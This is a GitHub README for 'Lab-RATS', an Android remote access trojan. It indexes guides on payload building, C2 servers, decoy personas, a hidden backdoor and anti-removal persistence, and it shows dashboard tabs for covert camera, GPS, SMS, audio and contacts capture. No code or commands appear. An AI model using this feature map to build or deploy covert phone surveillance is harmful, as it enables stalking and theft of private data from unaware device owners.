  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=28&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Documentation+Index" alt="Typing Banner"/>
</p>

| File                                                               | Subject & Contents                                                  |
|:-------------------------------------------------------------------|:--------------------------------------------------------------------|
| **[00-Quickstart.md](00-Quickstart.md)**                           | 3-step quickstart guide from clone to live dashboard connection.    |
| **[01-Requirements.md](01-Requirements.md)**                       | Workstation build host, JDK, Android SDK, and device compatibility. |
| **[02-Building Payloads.md](02-Building_Payloads.md)**             | Builder menu options, configuration keys, and decoy personas.       |
| **[03-C2 Deployment.md](03-C2_Deployment.md)**                     | C2 deployment options: Render C2 relay, Direct IP, Google Sheets.   |
| **[04-Device HTTP-API.md](04-Device_HTTP-API.md)**                 | Device HTTP API reference for control endpoints.                    |
| **[05-Dashboard Reference.md](05-Dashboard_Reference.md)**         | Overview of the 13 C2 dashboard tabs and features.                  |
| **[06-Stealth and Persistence.md](06-Stealth_and_Persistence.md)** | Decoy personas, 10-tap backdoor, watchdog layers, and anti-removal. |
| **[07-Troubleshooting.md](07-Troubleshooting.md)**                 | Solutions for common build, installation, and connection issues.    |
| **[08-Architecture.md](08-Architecture.md)**                       | High-level system architecture diagram and component map.           |
| **[09-Security Notes.md](09-Security_Notes.md)**                   | Security considerations, authentication, and forensic reduction.    |
| **[10-FAQ.md](10-FAQ.md)**                                         | Frequently asked questions and answers.                             |
| **[11-Maintaining Your Fork.md](11-Maintaining_Your_Fork.md)**     | Guidelines for rebranding and syncing upstream updates.             |
| **[12-Server Setup.md](12-Server_Setup.md)**                       | C2 server setup guide for Render.com and Linux VPS.                 |
| **[13-Direct IPv6 Hardening.md](13-Direct_IPv6_Hardening.md)**     | Direct IPv6 connection & pre-flight security hardening guide.       |
| **[14-Free IPv6 Hosting.md](14-Free_IPv6_Hosting.md)**             | Free hosting provider comparison.                                   |

---

<p align="left">
  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=28&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Support+the+Development" alt="Typing Banner"/>
</p>

**If** you find **Lab-RATS Awesome** and **Useful for your Testing & Security Research**, **Please Star ⭐ the project**—it **drives further development!**

<p align="left">
  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=20&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Contributions" alt="Typing Banner"/>
</p>

**Bug Reports, Add New Feature** and **Pull Requests** are **Always Welcome!** *(See [CONTRIBUTING.md](https://github.com/K4N3CO/Lab-RATS/blob/main/CONTRIBUTING.md) for **more info**)*.

---

<p align="left">
  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=20&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Donations" alt="Typing Banner"
 />
</p>

[<img src="https://img.shields.io/badge/Buy_Me_A_Coffee-FFDD00?style=for-the-badge&logo=buy-me-a-coffee&logoColor=black">](https://buymeacoffee.com/k4n3co)

---

<p align="left">
  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=28&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Video+Clips" alt="Typing Banner"
 />
</p>

### Git Clone & APK-Builder Example *(MacBook-Air M2)*:

https://github.com/user-attachments/assets/035088f1-e906-48c6-a1a6-0f7dd0356276

---

### NEW! Masked 'One-Click' Initial Install Sequence (Samsung Flip 7)

https://github.com/user-attachments/assets/4f1722b0-f964-4d30-b315-9534e64da317

---

### Remote C2 Dashboard - Remote Shell & Decoys:

https://github.com/user-attachments/assets/37109047-b727-4914-b19f-42edcedd770a

---

### Remote C2 Dashboard - Ghost Ops & Locate:

https://github.com/user-attachments/assets/ccaae63f-493b-44b3-a662-f9d1d2792523

---

### Remote C2 Dashboard - Covert Camera Hub:

https://github.com/user-attachments/assets/5d98cc43-d65b-4f63-a587-97453736b2ba

---

<p align="left">
  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=28&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Screenshots" alt="Typing Banner"
 />
</p>

### 00. Lab-RATS Installed on Android Device:

<details>
  <summary>📸 View App Screenshot</summary>
  <br>
  <img src="https://github.com/user-attachments/assets/928a2a7a-a6de-4b32-93ee-7811de3b06a2" alt="Full Web Page Screenshot" width="30%">
</details>

---

### 01. Home/Terminal Tab:

<details>
  <summary><b>📸 View Dashboard Screenshot</summary></b>
  <br>
  <img src="https://github.com/user-attachments/assets/7f4e02c5-4984-48e5-a76c-6c4ba530495c" alt="Full Web Page Screenshot" width="80%">
</details>

---

### 02. Ghost Operations Tab:

<details>
  <summary><b>📸 View Dashboard Screenshot</summary></b>
  <br>
  <img src="https://github.com/user-attachments/assets/3eb33ae7-aebd-4464-8547-979bb296eb27" alt="Full Web Page Screenshot" width="80%">
</details>

---

### 03. Optics/Live Camera Tab:

<details>
  <summary><b>📸 View Dashboard Screenshot</summary></b>
  <br>
  <img src="https://github.com/user-attachments/assets/bea953b9-753e-412d-b10e-12ded5055d82" alt="Full Web Page Screenshot" width="80%">
</details>

---

### 04. Locate/Live GPS Tab:

<details>
  <summary><b>📸 View Dashboard Screenshot</summary></b>
  <br>
  <img src="https://github.com/user-attachments/assets/3425ccc3-db7b-43ab-b3b9-8cb3c555469b" alt="Full Web Page Screenshot" width="80%">
</details>

---

### 05. Exploit Factory Tab:

<details>
  <summary><b>📸 View Dashboard Screenshot</summary></b>
  <br>
  <img src="https://github.com/user-attachments/assets/2aaa4c63-1ee8-4589-a78c-c2fc6e4deadf" alt="Full Web Page Screenshot" width="80%">
</details>

---

### 06. Device Data/Storage Tab:

<details>
  <summary><b>📸 View Dashboard Screenshot</summary></b>
  <br>
  <img src="https://github.com/user-attachments/assets/835edd2f-35b4-4b7d-b527-c36ffa18990f" alt="Full Web Page Screenshot" width="80%">
</details>

---

### 07. Intel/App Notifications Tab:

<details>
  <summary><b>📸 View Dashboard Screenshot</summary></b>
  <br>
  <img src="https://github.com/user-attachments/assets/5ff097a0-4460-4a54-a149-253b628f7f01" alt="Full Web Page Screenshot" width="80%">
</details>

---

### 08. SMS/Text Message Tab:

<details>
  <summary><b>📸 View Dashboard Screenshot</summary></b>
  <br>
  <img src="https://github.com/user-attachments/assets/54acccb7-b412-4a57-9c15-ca36ce58050d" alt="Full Web Page Screenshot" width="80%">
</details>

---

### 09. MMS/Multimedia Message Tab:

<details>
  <summary><b>📸 View Dashboard Screenshot</summary></b>
  <br>
  <img src="https://github.com/user-attachments/assets/5340b242-bec6-440f-80ae-b1850d6eb163" alt="Full Web Page Screenshot" width="80%">
</details>

---

### 10. Acoustics/Audio Tab:

<details>
  <summary><b>📸 View Dashboard Screenshot</summary></b>
  <br>
  <img src="https://github.com/user-attachments/assets/4ec71933-6264-4d75-90db-aebfdf40e636" alt="Full Web Page Screenshot" width="80%">
</details>

---

### 11. Comms/Call Logs Tab:

<details>
  <summary><b>📸 View Dashboard Screenshot</summary></b>
  <br>
  <img src="https://github.com/user-attachments/assets/ae00ca08-43e0-42c8-8bfa-fde16523d096" alt="Full Web Page Screenshot" width="80%">
</details>

---

### 12. Contacts Tab:

<details>
  <summary><b>📸 View Dashboard Screenshot</summary></b>
  <br>
  <img src="https://github.com/user-attachments/assets/1da37dba-a84a-4e0f-8453-d763e73bade0" alt="Full Web Page Screenshot" width="80%">
</details>

---

### 13. Hardware/Device Info Tab:

<details>
  <summary><b>📸 View Dashboard Screenshot</summary></b>
  <br>
  <img src="https://github.com/user-attachments/assets/f1874c3d-0866-4c1f-9f94-f5ca2c1aed6e" alt="Full Web Page Screenshot" width="80%">
</details>

---

<p align="left">
  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=28&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Disclaimer" alt="Typing Banner"
 />
</p>

**Lab-RATS is for Educational and Authorized Security testing purposes ONLY!**. The **Developers & Contributors assume NO Responsibility for ANY** **Misuse, Damage to Devices or Relationships caused by this Software**. **Please use it Responsibly**. **Thank You!**

---

<p align="left">
  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=28&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=License" alt="Typing Banner"
 />
</p>

**Lab-RATS** is **Licensed** to **K4N3CO** under the [MIT License](LICENSE).

---

<div align="center">
  <video src="https://github.com/user-attachments/assets/2892c9d5-724a-4809-bf3f-1ccd585de0e7" width="50%" controls></video>
</div>

<p align="center">
<img src="https://img.shields.io/badge/The one's who MIND don't matter...-The one's who MATTER don't mind...-cyan?style=for-the-badge&logo=maserati&logoColor=black">
<br>
<p align="center">
<img src="https://img.shields.io/badge/©2026-K4N3CO-darkred?style=for-the-badge&logo=magisk&logoColor=white">
